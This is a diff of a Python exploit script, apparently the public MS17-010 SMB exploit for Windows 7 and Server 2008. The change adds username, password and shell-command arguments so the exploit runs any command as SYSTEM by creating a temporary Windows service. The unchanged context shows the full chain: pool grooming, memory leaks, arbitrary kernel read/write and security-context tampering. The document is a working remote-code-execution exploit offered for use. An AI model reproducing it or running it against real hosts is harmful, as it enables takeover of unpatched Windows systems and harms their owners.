@@ -22,8 +22,6 @@ Tested on:
 - Windows 7 SP1 x64
 '''
 
-USERNAME = ''
-PASSWORD = ''
 
 '''
 Reversed from: SrvAllocateSecurityContext() and SrvImpersonateSecurityContext()
@@ -100,7 +98,7 @@ def reset_extra_mid(conn):
 	global extra_last_mid, special_mid
 	special_mid = (conn.next_mid() & 0xff00) - 0x100
 	extra_last_mid = special_mid
-	
+
 def next_extra_mid():
 	global extra_last_mid
 	extra_last_mid += 1
@@ -121,7 +119,7 @@ def leak_frag_size(conn, tid, fid):
 	mid = conn.next_mid()
 	req1 = conn.create_nt_trans_packet(5, param=pack('<HH', fid, 0), mid=mid, data='A'*0x10d0, maxParameterCount=GROOM_TRANS_SIZE-0x10d0)
 	req2 = conn.create_nt_trans_secondary_packet(mid, data='B'*276) # leak more 276 bytes
-	
+
 	conn.send_raw(req1[:-8])
 	conn.send_raw(req1[-8:]+req2)
 	leakData = conn.recv_transaction_data(mid, 0x10d0+276)
@@ -132,7 +130,7 @@ def leak_frag_size(conn, tid, fid):
 	if leakData[0x14:0x18] != 'Frag':
 		print('Not found Frag pool tag in leak data')
 		sys.exit()
-	
+
 	# Frag pool size might be 0x10 or 0x20
 	fragPoolSize = ord(leakData[0x12]) << 4
 	print('Got frag size: 0x{:x}'.format(fragPoolSize))
@@ -159,7 +157,7 @@ def align_transaction_and_leak(conn, tid, fid, numFill=4):
 
 	conn.send_raw(req1[:-8])
 	conn.send_raw(req1[-8:]+req2+req3+''.join(reqs))
-	
+
 	# expected transactions alignment ("Frag" pool is not shown)
 	#
 	#    |         5 * PAGE_SIZE         |   PAGE_SIZE    |         5 * PAGE_SIZE         |   PAGE_SIZE    |
@@ -180,7 +178,7 @@ def align_transaction_and_leak(conn, tid, fid, numFill=4):
 	if leakData[0x14:0x18] != 'Frag':
 		print('Not found Frag pool tag in leak data')
 		return None
-	
+
 	# ================================
 	# verify leak data
 	# ================================
@@ -232,7 +230,7 @@ def read_data(conn, info, read_addr, read_size):
 	new_data += pack('<III', read_size, read_size, read_size)  # DataCount, TotalDataCount, MaxDataCount
 	new_data += pack('<HH', 0, 5)  # Category, Function (NT_RENAME)
 	conn.send_nt_trans_secondary(mid=info['trans1_mid'], data=new_data, dataDisplacement=TRANS_INPARAM_OFFSET)
-	
+
 	# create one more transaction before leaking data
 	# - next transaction can be used for arbitrary read/write after the current trans2 is done
 	# - next transaction address is from TransactionListEntry.Flink value
@@ -241,10 +239,10 @@ def read_data(conn, info, read_addr, read_size):
 	# finish the trans2 to leak
 	conn.send_nt_trans_secondary(mid=info['trans2_mid'])
 	read_data = conn.recv_transaction_data(info['trans2_mid'], 16+read_size)
-	
+
 	# set new trans2 address
 	info['trans2_addr'] = unpack('<Q', read_data[:8])[0] - TRANS_FLINK_OFFSET
-	
+
 	# set trans1.InData to &trans2
 	conn.send_nt_trans_secondary(mid=info['trans1_mid'], param=pack('<Q', info['trans2_addr']), paramDisplacement=TRANS_INDATA_OFFSET)
 	wait_for_request_processed(conn)
@@ -252,7 +250,7 @@ def read_data(conn, info, read_addr, read_size):
 	# modify trans2 mid
 	conn.send_nt_trans_secondary(mid=info['trans1_mid'], data=pack('<H', info['trans2_mid']), dataDisplacement=TRANS_MID_OFFSET)
 	wait_for_request_processed(conn)
-	
+
 	return read_data[16:]  # no need to return parameter
 
 
@@ -260,21 +258,21 @@ def write_data(conn, info, write_addr, write_data):
 	# trans2.InData
 	conn.send_nt_trans_secondary(mid=info['trans1_mid'], data=pack('<Q', write_addr), dataDisplacement=TRANS_INDATA_OFFSET)
 	wait_for_request_processed(conn)
-	
+
 	# write data
 	conn.send_nt_trans_secondary(mid=info['trans2_mid'], data=write_data)
 	wait_for_request_processed(conn)
 
 
-def exploit(target, pipe_name):
+def exploit(target, pipe_name, username, password, cmd):
 	conn = MYSMB(target)
-	
+
 	# set NODELAY to make exploit much faster
 	conn.get_socket().setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
 
 	info = {}
 
-	conn.login(USERNAME, PASSWORD, maxBufferSize=4356)
+	conn.login(username, password, maxBufferSize=4356)
 	server_os = conn.get_server_os()
 	print('Target OS: '+server_os)
 	if server_os.startswith("Windows 7 ") or (server_os.startswith("Windows Server ") and ' 2008 ' in server_os):
@@ -306,7 +304,7 @@ def exploit(target, pipe_name):
 		conn.disconnect_tree(tid)
 	if leakInfo is None:
 		return False
-	
+
 	info['fid'] = fid
 	info.update(leakInfo)
 
@@ -338,7 +336,7 @@ def exploit(target, pipe_name):
 	# NSA exploit set refCnt on leaked transaction to very large number for reading data repeatly
 	# but this method make the transation never get freed
 	# I will avoid memory leak
-	
+
 	# ================================
 	# modify trans1 struct to be used for arbitrary read/write
 	# ================================
@@ -363,7 +361,7 @@ def exploit(target, pipe_name):
 	# ================================	
 	# Note: Windows XP stores only PCtxtHandle and uses ImpersonateSecurityContext() for impersonation, so this
 	#         method does not work on Windows XP. But with arbitrary read/write, code execution is not difficult.
-	
+
 	print('make this SMB session to be SYSTEM')
 	# IsNullSession = 0, IsAdmin = 1
 	write_data(conn, info, info['session']+info['SESSION_ISNULL_OFFSET'], '\x00\x01')
@@ -371,7 +369,7 @@ def exploit(target, pipe_name):
 	# read session struct to get SecurityContext address
 	sessionData = read_data(conn, info, info['session'], 0x100)
 	secCtxAddr = unpack('<Q', sessionData[info['SESSION_SECCTX_OFFSET']:info['SESSION_SECCTX_OFFSET']+8])[0]
-	
+
 	# copy SecurityContext for restoration
 	secCtxData = read_data(conn, info, secCtxAddr, info['SECCTX_SIZE'])
 
@@ -383,7 +381,7 @@ def exploit(target, pipe_name):
 	# do whatever we want as SYSTEM over this SMB connection
 	# ================================	
 	try:
-		smb_pwn(conn)
+		smb_pwn(conn, cmd)
 	except:
 		pass
 
@@ -395,23 +393,26 @@ def exploit(target, pipe_name):
 	conn.get_socket().close()
 	return True
 
-def smb_pwn(conn):
+def smb_pwn(conn, cmd):
 	smbConn = smbconnection.SMBConnection(conn.get_remote_host(), conn.get_remote_host(), existingConnection=conn, manualNegotiate=True)
-	
+
 	print('creating file c:\\pwned.txt on the target')
 	tid2 = smbConn.connectTree('C$')
 	fid2 = smbConn.createFile(tid2, '/pwned.txt')
 	smbConn.closeFile(tid2, fid2)
 	smbConn.disconnectTree(tid2)
-	
+
+	shell_cmd = r'cmd /c'
+	shell_cmd += cmd
 	#service_exec(smbConn, r'cmd /c copy c:\pwned.txt c:\pwned_exec.txt')
+	service_exec(smbConn, shell_cmd)
 
 # based on impacket/examples/serviceinstall.py
 def service_exec(smbConn, cmd):
 	import random
 	import string
 	from impacket.dcerpc.v5 import transport, srvs, scmr
-	
+
 	service_name = ''.join([random.choice(string.letters) for i in range(4)])
 
 	# Setup up a DCE SMBTransport with the connection already in place
@@ -424,7 +425,7 @@ def service_exec(smbConn, cmd):
 		print("Opening SVCManager on %s....." % smbConn.getRemoteHost())
 		resp = scmr.hROpenSCManagerW(rpcsvc)
 		svcHandle = resp['lpScHandle']
-		
+
 		# First we try to open the service in case it exists. If it does, we remove it.
 		try:
 			resp = scmr.hROpenServiceW(rpcsvc, svcHandle, service_name+'\x00')
@@ -435,11 +436,11 @@ def service_exec(smbConn, cmd):
 			# It exists, remove it
 			scmr.hRDeleteService(rpcsvc, resp['lpServiceHandle'])
 			scmr.hRCloseServiceHandle(rpcsvc, resp['lpServiceHandle'])
-		
+
 		print('Creating service %s.....' % service_name)
 		resp = scmr.hRCreateServiceW(rpcsvc, svcHandle, service_name + '\x00', service_name + '\x00', lpBinaryPathName=cmd + '\x00')
 		serviceHandle = resp['lpServiceHandle']
-		
+
 		if serviceHandle:
 			# Start service
 			try:
@@ -451,7 +452,7 @@ def service_exec(smbConn, cmd):
 				scmr.hRControlService(rpcsvc, serviceHandle, scmr.SERVICE_CONTROL_STOP)
 			except Exception, e:
 				print(str(e))
-			
+
 			print('Removing service %s.....' % service_name)
 			scmr.hRDeleteService(rpcsvc, serviceHandle)
 			scmr.hRCloseServiceHandle(rpcsvc, serviceHandle)
@@ -465,12 +466,16 @@ def service_exec(smbConn, cmd):
 	rpcsvc.disconnect()
 
 
-if len(sys.argv) != 3:
-	print("{} <ip> <pipe_name>".format(sys.argv[0]))
+if len(sys.argv) != 6:
+	print("{} <ip> <pipe_name> <DOMAIN\\username> <password> \"<shell_command>\"".format(sys.argv[0]))
 	sys.exit(1)
 
 target = sys.argv[1]
 pipe_name = sys.argv[2]
+username = sys.argv[3]
+password = sys.argv[4]
+cmd = sys.argv[5]
 
-exploit(target, pipe_name)
+print cmd
+exploit(target, pipe_name, username, password, cmd)
 print('Done')
